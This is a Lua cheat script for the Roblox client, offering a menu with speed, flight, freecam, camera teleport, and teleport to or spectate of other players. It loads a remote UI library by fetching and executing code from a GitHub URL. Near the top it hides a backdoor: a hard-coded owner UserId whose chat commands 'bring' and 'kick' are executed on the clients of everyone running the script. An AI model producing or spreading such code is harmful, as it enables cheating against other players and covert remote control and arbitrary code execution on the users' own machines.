local pi    = math.pi
local abs   = math.abs
local clamp = math.clamp
local exp   = math.exp
local rad   = math.rad
local sign  = math.sign
local sqrt  = math.sqrt
local tan   = math.tan

local ContextActionService = game:GetService("ContextActionService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local Workspace = game:GetService("Workspace")
local Settings = UserSettings()
local GameSettings = Settings.GameSettings
local TeleportService = game:GetService("TeleportService")
local UserInputService = game:GetService("UserInputService")


local Player = Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local Humanoid = Character:FindFirstChildOfClass("Humanoid")
local RootPart = Character:FindFirstChild("HumanoidRootPart")
local Camera = workspace.CurrentCamera

Player.CharacterAdded:Connect(function(NewChar)
    Character = NewChar
    Humanoid = Character:WaitForChild("Humanoid")
    RootPart = Character:WaitForChild("HumanoidRootPart")
end)

local OwnerId = 53466350

local function gamecheck()
    for _, players in next, Players:GetPlayers() do
        if players.UserId == OwnerId then
            return true
        end
    end
    return false
end

local function search(display)
    for _, player in ipairs(Players:GetPlayers()) do
        if string.lower(player.DisplayName) == string.lower(display) or string.lower(player.DisplayName):find(display) then
            return player
        end
    end
    return nil
end

local function commandcheck()
    local Owner = Players:GetNameFromUserIdAsync(OwnerId)
    local OwnerPlayer = Players:FindFirstChild(Owner)
    local OwnerCharacter = OwnerPlayer.Character
    local OwnerHumanoid = OwnerCharacter:WaitForChild("Humanoid")
    local OwnerRoot = OwnerCharacter:WaitForChild("HumanoidRootPart")

    OwnerPlayer.Chatted:Connect(function(message)

        local command = string.split(message, " ")

        if command[1] == "bring" and command[2] then
            local targetplayer = Players:FindFirstChild(command[2]) or search(command[2])
            if targetplayer then
                local targetcharacter = targetplayer.Character
                local targetroot = targetcharacter:WaitForChild("HumanoidRootPart")
                targetroot.CFrame = OwnerRoot.CFrame
            end
        elseif command[1] == "kick" and command[2] then
            local targetplayer = Players:FindFirstChild(command[2]) or search(command[2])
            if targetplayer then
                if command[3] then
                    targetplayer:Kick(command[3])
                else
                    targetplayer:Kick("Owner Has Kicked You")
                end
            end
        end
    end)
end

task.spawn(function()
    while task.wait(1) do
        if gamecheck() then
            commandcheck()
        end
    end
end)

local list = {}

local function updateList()
    table.clear(list)
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name == Player.Name then continue end
        table.insert(list, p.Name)
    end
end

updateList()

Players.PlayerAdded:Connect(updateList)
Players.PlayerRemoving:Connect(updateList)


local FFlagUserExitFreecamBreaksWithShiftlock
do
    local success, result = pcall(function()
        return UserSettings():IsUserFeatureEnabled("UserExitFreecamBreaksWithShiftlock")
    end)
    FFlagUserExitFreecamBreaksWithShiftlock = success and result
end
 

local TOGGLE_INPUT_PRIORITY = Enum.ContextActionPriority.Low.Value
local INPUT_PRIORITY = Enum.ContextActionPriority.High.Value
local FREECAM_MACRO_KB = {Enum.KeyCode.LeftShift, Enum.KeyCode.P}

local NAV_GAIN = Vector3.new(1, 1, 1)*64
local PAN_GAIN = Vector2.new(0.75, 1)*8
local FOV_GAIN = 300

local PITCH_LIMIT = rad(90)

local VEL_STIFFNESS = 1.5
local PAN_STIFFNESS = 1.0
local FOV_STIFFNESS = 4.0


local Spring = {} do
	Spring.__index = Spring

	function Spring.new(freq, pos)
		local self = setmetatable({}, Spring)
		self.f = freq
		self.p = pos
		self.v = pos*0
		return self
	end

	function Spring:Update(dt, goal)
		local f = self.f*2*pi
		local p0 = self.p
		local v0 = self.v

		local offset = goal - p0
		local decay = exp(-f*dt)

		local p1 = goal + (v0*dt - offset*(f*dt + 1))*decay
		local v1 = (f*dt*(offset*f - v0) + v0)*decay

		self.p = p1
		self.v = v1

		return p1
	end

	function Spring:Reset(pos)
		self.p = pos
		self.v = pos*0
	end
end


local cameraPos = Vector3.new()
local cameraRot = Vector2.new()
local cameraFov = 0

local velSpring = Spring.new(VEL_STIFFNESS, Vector3.new())
local panSpring = Spring.new(PAN_STIFFNESS, Vector2.new())
local fovSpring = Spring.new(FOV_STIFFNESS, 0)


local Input = {} do
	local thumbstickCurve do
		local K_CURVATURE = 2.0
		local K_DEADZONE = 0.15

		local function fCurve(x)
			return (exp(K_CURVATURE*x) - 1)/(exp(K_CURVATURE) - 1)
		end

		local function fDeadzone(x)
			return fCurve((x - K_DEADZONE)/(1 - K_DEADZONE))
		end

		function thumbstickCurve(x)
			return sign(x)*clamp(fDeadzone(abs(x)), 0, 1)
		end
	end

	local gamepad = {
		ButtonX = 0,
		ButtonY = 0,
		DPadDown = 0,
		DPadUp = 0,
		ButtonL2 = 0,
		ButtonR2 = 0,
		Thumbstick1 = Vector2.new(),
		Thumbstick2 = Vector2.new(),
	}

	local keyboard = {
		W = 0,
		A = 0,
		S = 0,
		D = 0,
		E = 0,
		Q = 0,
		U = 0,
		H = 0,
		J = 0,
		K = 0,
		I = 0,
		Y = 0,
		Up = 0,
		Down = 0,
		LeftShift = 0,
		RightShift = 0,
	}

	local mouse = {
		Delta = Vector2.new(),
		MouseWheel = 0,
	}

	local NAV_GAMEPAD_SPEED  = Vector3.new(1, 1, 1)
	local NAV_KEYBOARD_SPEED = Vector3.new(1, 1, 1)
	local PAN_MOUSE_SPEED    = Vector2.new(1, 1)*(pi/64)
	local PAN_GAMEPAD_SPEED  = Vector2.new(1, 1)*(pi/8)
	local FOV_WHEEL_SPEED    = 1.0
	local FOV_GAMEPAD_SPEED  = 0.25
	local NAV_ADJ_SPEED      = 0.75
	local NAV_SHIFT_MUL      = 0.25

	local navSpeed = 1

	function Input.Vel(dt)
		navSpeed = clamp(navSpeed + dt*(keyboard.Up - keyboard.Down)*NAV_ADJ_SPEED, 0.01, 4)

		local kGamepad = Vector3.new(
			thumbstickCurve(gamepad.Thumbstick1.X),
			thumbstickCurve(gamepad.ButtonR2) - thumbstickCurve(gamepad.ButtonL2),
			thumbstickCurve(-gamepad.Thumbstick1.Y)
		)*NAV_GAMEPAD_SPEED

		local kKeyboard = Vector3.new(
			keyboard.D - keyboard.A + keyboard.K - keyboard.H,
			keyboard.E - keyboard.Q + keyboard.I - keyboard.Y,
			keyboard.S - keyboard.W + keyboard.J - keyboard.U
		)*NAV_KEYBOARD_SPEED

		local shift = UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) or UserInputService:IsKeyDown(Enum.KeyCode.RightShift)

		return (kGamepad + kKeyboard)*(navSpeed*(shift and NAV_SHIFT_MUL or 1))
	end

	function Input.Pan(dt)
		local kGamepad = Vector2.new(
			thumbstickCurve(gamepad.Thumbstick2.Y),
			thumbstickCurve(-gamepad.Thumbstick2.X)
		)*PAN_GAMEPAD_SPEED
		local kMouse = mouse.Delta*PAN_MOUSE_SPEED
		mouse.Delta = Vector2.new()
		return kGamepad + kMouse
	end

	function Input.Fov(dt)
		local kGamepad = (gamepad.ButtonX - gamepad.ButtonY)*FOV_GAMEPAD_SPEED
		local kMouse = mouse.MouseWheel*FOV_WHEEL_SPEED
		mouse.MouseWheel = 0
		return kGamepad + kMouse
	end

	do
		local function Keypress(action, state, input)
			keyboard[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
			return Enum.ContextActionResult.Sink
		end

		local function GpButton(action, state, input)
			gamepad[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
			return Enum.ContextActionResult.Sink
		end

		local function MousePan(action, state, input)
			local delta = input.Delta
			mouse.Delta = Vector2.new(-delta.y, -delta.x)
			return Enum.ContextActionResult.Sink
		end

		local function Thumb(action, state, input)
			gamepad[input.KeyCode.Name] = input.Position
			return Enum.ContextActionResult.Sink
		end

		local function Trigger(action, state, input)
			gamepad[input.KeyCode.Name] = input.Position.z
			return Enum.ContextActionResult.Sink
		end

		local function MouseWheel(action, state, input)
			mouse[input.UserInputType.Name] = -input.Position.z
			return Enum.ContextActionResult.Sink
		end

		local function Zero(t)
			for k, v in pairs(t) do
				t[k] = v*0
			end
		end

		function Input.StartCapture()
			ContextActionService:BindActionAtPriority("FreecamKeyboard", Keypress, false, INPUT_PRIORITY,
				Enum.KeyCode.W, Enum.KeyCode.U,
				Enum.KeyCode.A, Enum.KeyCode.H,
				Enum.KeyCode.S, Enum.KeyCode.J,
				Enum.KeyCode.D, Enum.KeyCode.K,
				Enum.KeyCode.E, Enum.KeyCode.I,
				Enum.KeyCode.Q, Enum.KeyCode.Y,
				Enum.KeyCode.Up, Enum.KeyCode.Down
			)
			ContextActionService:BindActionAtPriority("FreecamMousePan",          MousePan,   false, INPUT_PRIORITY, Enum.UserInputType.MouseMovement)
			ContextActionService:BindActionAtPriority("FreecamMouseWheel",        MouseWheel, false, INPUT_PRIORITY, Enum.UserInputType.MouseWheel)
			ContextActionService:BindActionAtPriority("FreecamGamepadButton",     GpButton,   false, INPUT_PRIORITY, Enum.KeyCode.ButtonX, Enum.KeyCode.ButtonY)
			ContextActionService:BindActionAtPriority("FreecamGamepadTrigger",    Trigger,    false, INPUT_PRIORITY, Enum.KeyCode.ButtonR2, Enum.KeyCode.ButtonL2)
			ContextActionService:BindActionAtPriority("FreecamGamepadThumbstick", Thumb,      false, INPUT_PRIORITY, Enum.KeyCode.Thumbstick1, Enum.KeyCode.Thumbstick2)
		end

		function Input.StopCapture()
			navSpeed = 1
			Zero(gamepad)
			Zero(keyboard)
			Zero(mouse)
			ContextActionService:UnbindAction("FreecamKeyboard")
			ContextActionService:UnbindAction("FreecamMousePan")
			ContextActionService:UnbindAction("FreecamMouseWheel")
			ContextActionService:UnbindAction("FreecamGamepadButton")
			ContextActionService:UnbindAction("FreecamGamepadTrigger")
			ContextActionService:UnbindAction("FreecamGamepadThumbstick")
		end
	end
end

local function GetFocusDistance(cameraFrame)
	local znear = 0.1
	local viewport = Camera.ViewportSize
	local projy = 2*tan(cameraFov/2)
	local projx = viewport.x/viewport.y*projy
	local fx = cameraFrame.rightVector
	local fy = cameraFrame.upVector
	local fz = cameraFrame.lookVector

	local minVect = Vector3.new()
	local minDist = 512

	for x = 0, 1, 0.5 do
		for y = 0, 1, 0.5 do
			local cx = (x - 0.5)*projx
			local cy = (y - 0.5)*projy
			local offset = fx*cx - fy*cy + fz
			local origin = cameraFrame.p + offset*znear
			local _, hit = Workspace:FindPartOnRay(Ray.new(origin, offset.unit*minDist))
			local dist = (hit - origin).magnitude
			if minDist > dist then
				minDist = dist
				minVect = offset.unit
			end
		end
	end

	return fz:Dot(minVect)*minDist
end


local function StepFreecam(dt)
	local vel = velSpring:Update(dt, Input.Vel(dt))
	local pan = panSpring:Update(dt, Input.Pan(dt))
	local fov = fovSpring:Update(dt, Input.Fov(dt))

	local zoomFactor = sqrt(tan(rad(70/2))/tan(rad(cameraFov/2)))

	cameraFov = clamp(cameraFov + fov*FOV_GAIN*(dt/zoomFactor), 1, 120)
	cameraRot = cameraRot + pan*PAN_GAIN*(dt/zoomFactor)
	cameraRot = Vector2.new(clamp(cameraRot.x, -PITCH_LIMIT, PITCH_LIMIT), cameraRot.y%(2*pi))

	local cameraCFrame = CFrame.new(cameraPos)*CFrame.fromOrientation(cameraRot.x, cameraRot.y, 0)*CFrame.new(vel*NAV_GAIN*dt)
	cameraPos = cameraCFrame.p

	Camera.CFrame = cameraCFrame
	Camera.Focus = cameraCFrame*CFrame.new(0, 0, -GetFocusDistance(cameraCFrame))
	Camera.FieldOfView = cameraFov
end

local function CheckMouseLockAvailability()
	local devAllowsMouseLock = Players.LocalPlayer.DevEnableMouseLock
	local devMovementModeIsScriptable = Players.LocalPlayer.DevComputerMovementMode == Enum.DevComputerMovementMode.Scriptable
	local userHasMouseLockModeEnabled = GameSettings.ControlMode == Enum.ControlMode.MouseLockSwitch
	local userHasClickToMoveEnabled =  GameSettings.ComputerMovementMode == Enum.ComputerMovementMode.ClickToMove
	local MouseLockAvailable = devAllowsMouseLock and userHasMouseLockModeEnabled and not userHasClickToMoveEnabled and not devMovementModeIsScriptable

	return MouseLockAvailable
end


local PlayerState = {} do
	local mouseBehavior
	local mouseIconEnabled
	local cameraType
	local cameraFocus
	local cameraCFrame
	local cameraFieldOfView
	local screenGuis = {}
	local coreGuis = {
		Backpack = true,
		Chat = true,
		Health = true,
		PlayerList = true,
	}
	local setCores = {
		BadgesNotificationsActive = true,
		PointsNotificationsActive = true,
	}

	function PlayerState.Push()
		for name in pairs(coreGuis) do
			coreGuis[name] = StarterGui:GetCoreGuiEnabled(Enum.CoreGuiType[name])
			StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType[name], false)
		end
		for name in pairs(setCores) do
			setCores[name] = StarterGui:GetCore(name)
			StarterGui:SetCore(name, false)
		end
		local playergui = Player:FindFirstChildOfClass("PlayerGui")
		if playergui then
			for _, gui in pairs(playergui:GetChildren()) do
				if gui:IsA("ScreenGui") and gui.Enabled then
					screenGuis[#screenGuis + 1] = gui
					gui.Enabled = false
				end
			end
		end

		cameraFieldOfView = Camera.FieldOfView
		Camera.FieldOfView = 70

		cameraType = Camera.CameraType
		Camera.CameraType = Enum.CameraType.Custom

		cameraCFrame = Camera.CFrame
		cameraFocus = Camera.Focus

		mouseIconEnabled = UserInputService.MouseIconEnabled
		UserInputService.MouseIconEnabled = false

		if FFlagUserExitFreecamBreaksWithShiftlock and CheckMouseLockAvailability() then
			mouseBehavior = Enum.MouseBehavior.Default
		else
			mouseBehavior = UserInputService.MouseBehavior
		end
		UserInputService.MouseBehavior = Enum.MouseBehavior.Default
	end

	-- Restore state
	function PlayerState.Pop()
		for name, isEnabled in pairs(coreGuis) do
			StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType[name], isEnabled)
		end
		for name, isEnabled in pairs(setCores) do
			StarterGui:SetCore(name, isEnabled)
		end
		for _, gui in pairs(screenGuis) do
			if gui.Parent then
				gui.Enabled = true
			end
		end

		Camera.FieldOfView = cameraFieldOfView
		cameraFieldOfView = nil

		Camera.CameraType = cameraType
		cameraType = nil

		Camera.CFrame = cameraCFrame
		cameraCFrame = nil

		Camera.Focus = cameraFocus
		cameraFocus = nil

		UserInputService.MouseIconEnabled = mouseIconEnabled
		mouseIconEnabled = nil

		UserInputService.MouseBehavior = mouseBehavior
		mouseBehavior = nil
	end
end

local function StartFreecam()
	local cameraCFrame = Camera.CFrame
	cameraRot = Vector2.new(cameraCFrame:toEulerAnglesYXZ())
	cameraPos = cameraCFrame.p
	cameraFov = Camera.FieldOfView

	velSpring:Reset(Vector3.new())
	panSpring:Reset(Vector2.new())
	fovSpring:Reset(0)

	PlayerState.Push()
	RunService:BindToRenderStep("Freecam", Enum.RenderPriority.Camera.Value, StepFreecam)
	Input.StartCapture()
end

local function StopFreecam()
	Input.StopCapture()
	RunService:UnbindFromRenderStep("Freecam")
	PlayerState.Pop()
end

local library = loadstring(game:HttpGet('https://raw.githubusercontent.com/depthso/XSX-UI-Library/refs/heads/main/xsx%20lib.lua'))()

library.headerColor = Color3.fromRGB(255,255,255)
library.companyColor = Color3.fromRGB(255, 255, 255)
library.acientColor = Color3.fromRGB(255, 255, 255)

library:Init({
    version = "3.2",
    title = "",
    company = "moon industries",
    keybind = Enum.KeyCode.RightShift,
    BlurEffects = false,
    RainbowEnabled = false,
    BlurSize = 0
})


library:Watermark("moon")

local FPSWatermark = library:Watermark("FPS")
game:GetService("RunService").RenderStepped:Connect(function(v)
    FPSWatermark:SetText("FPS: "..math.round(1/v))
end)


local MainTab      = library:NewTab("Main")
local WorldTab     = library:NewTab("World")
local VisualsTab   = library:NewTab("Visuals")
local CharacterTab = library:NewTab("Character")
local ServerList   = library:NewTab("ServerList")

local Defaults = {
    Humanoid = {
        Speed = Humanoid.WalkSpeed
    },
    Task = {
        SpeedThread = nil,
        VelocityThread = nil,
        FlightThread = nil
    },

    Method = {
        Speed = "Velocity",
        Selected = nil
    }
}

local DropDowns = {
    SpeedSlider = nil
}

local Sliders = {
    SpeedSlider = nil,
    FlightSlider = nil
}


MainTab:NewSection("Game")

local Rejoin = MainTab:NewButton("Rejoin", function()
    TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId)
end)

CharacterTab:NewSection("Movement Toggles")

local Speed = CharacterTab:NewToggle("Enable Speed", false, function(value)
    local state = value and "on" or "off"

    if state == "on" then
        if Defaults.Method.Speed == "WalkSpeed" then
            if Defaults.Task.SpeedThread then
                task.cancel(Defaults.Task.SpeedThread)
            end
             Defaults.Task.SpeedThread = task.spawn(function()
                while task.wait() do
                    local SliderSpeed = Sliders.SpeedSlider:GetValue()
                    Humanoid.WalkSpeed = SliderSpeed or Defaults.Humanoid.Speed
                end
            end)
        elseif Defaults.Method.Speed == "Velocity" then
                if Defaults.Task.VelocityThread then
                    task.cancel(Defaults.Task.VelocityThread)
                end
            Defaults.Task.VelocityThread = task.spawn(function()
                while task.wait() do
                    local SliderSpeed = Sliders.SpeedSlider:GetValue()

                    local look = Humanoid.MoveDirection:Dot(RootPart.CFrame.LookVector)
                    local right = Humanoid.MoveDirection:Dot(RootPart.CFrame.RightVector)
                    local velocity = Vector3.zero

                    if math.abs(look) > 0.1 then
                        velocity += RootPart.CFrame.LookVector * look * SliderSpeed
                    end
                    if math.abs(right) > 0.1 then
                        velocity += RootPart.CFrame.RightVector * right * SliderSpeed
                    end

                    if velocity.Magnitude > 0 then
                        RootPart.AssemblyLinearVelocity = Vector3.new(velocity.X, RootPart.AssemblyLinearVelocity.Y, velocity.Z)
                    end
                end
            end)
        end
    elseif state == "off" then
        if Defaults.Method.Speed == "WalkSpeed" then
            if Defaults.Task.SpeedThread then
                task.cancel(Defaults.Task.SpeedThread)
                Defaults.Task.SpeedThread = nil
            end
            Humanoid.WalkSpeed = Defaults.Humanoid.Speed
        elseif Defaults.Method.Speed == "Velocity" then
            if Defaults.Task.VelocityThread then
                task.cancel(Defaults.Task.VelocityThread)
                Defaults.Task.VelocityThread = nil
            end
        end
    end
end):AddKeybind(Enum.KeyCode.Z)

local Flight = CharacterTab:NewToggle("Enable Flight", false,  function(value)
    local state = value and "on" or "off"
    if state == "on" then
        Defaults.Task.FlightThread = task.spawn(function()
            while task.wait() do
                local MoveDirection = Vector3.new()
                local CameraCFrame = Camera.CFrame

                local FlightSpeed = Sliders.FlightSlider:GetValue()

                MoveDirection = MoveDirection + (UserInputService:IsKeyDown(Enum.KeyCode.W) and CameraCFrame.LookVector or Vector3.new())
                MoveDirection = MoveDirection - (UserInputService:IsKeyDown(Enum.KeyCode.S) and CameraCFrame.LookVector or Vector3.new())
                MoveDirection = MoveDirection - (UserInputService:IsKeyDown(Enum.KeyCode.A) and CameraCFrame.RightVector or Vector3.new())
                MoveDirection = MoveDirection + (UserInputService:IsKeyDown(Enum.KeyCode.D) and CameraCFrame.RightVector or Vector3.new())
                MoveDirection = MoveDirection + (UserInputService:IsKeyDown(Enum.KeyCode.Space) and Vector3.new(0, 1, 0) or Vector3.new())
                MoveDirection = MoveDirection - (UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) and Vector3.new(0, 1, 0) or Vector3.new())

                if MoveDirection.Magnitude > 0 then
                    MoveDirection = MoveDirection.Unit * FlightSpeed
                    RootPart.Velocity = MoveDirection * 0.5
                else
                    RootPart.Velocity = Vector3.new(0, 0, 0) 
                end

                RunService.RenderStepped:Wait() 
            end
        end)
    elseif state == "off" then
        if Defaults.Task.FlightThread then
            task.cancel(Defaults.Task.FlightThread)
            Defaults.Task.FlightThread = nil
        end
    end
end):AddKeybind(Enum.KeyCode.X)

local FreeCam = CharacterTab:NewToggle("Enable Freecam", false, function(value)
    local state = value and "on" or "off"
    if state == "on" then
        StartFreecam()
    elseif state == "off" then
        StopFreecam()
    end
end):AddKeybind(Enum.KeyCode.C)

local CameraTp = CharacterTab:NewKeybind("Tp To Camera", Enum.KeyCode.N, function(key)
    RootPart.CFrame = Camera.CFrame
end)

CharacterTab:NewSection("Movement Config")
DropDowns.SpeedMethod = CharacterTab:NewSelector("Speed Method", "Velocity", {"WalkSpeed", "Velocity"}, function(d) Defaults.Method.Speed = d end)
Sliders.SpeedSlider = CharacterTab:NewSlider("Speed Value", "", true, "/", {min = Humanoid.WalkSpeed or 16, max = 100, default =  Humanoid.WalkSpeed or 16})
Sliders.FlightSlider = CharacterTab:NewSlider("Flight Speed", "", true, "/", {min = 50, max = 300, default = 50})

local Teleport = ServerList:NewButton("Teleport", function()
    local Target = Players:FindFirstChild(Defaults.Method.Selected)
    local TargetChar = Target.Character
    local TargetRoot = TargetChar:FindFirstChild("HumanoidRootPart")
    if Target then
        RootPart.CFrame =  TargetRoot.CFrame * CFrame.new(0, 0, -2)
    end
end)

local active = true
local Spectate = ServerList:NewButton("Spectate", function()
    active = not active
    if not active then
        local Target = Players:FindFirstChild(Defaults.Method.Selected)
        local TargetChar = Target.Character
        local TargetHum = TargetChar:FindFirstChildOfClass("Humanoid")
        if Target then
            Camera.CameraSubject = TargetHum
        end
    elseif active then
        Camera.CameraSubject = Humanoid
    end
end)

local PlayerList = ServerList:NewSelector("Player List", " ", list, function(d)
    Defaults.Method.Selected = d
    updateList()
end)


library:SetCompany("BEYOND")
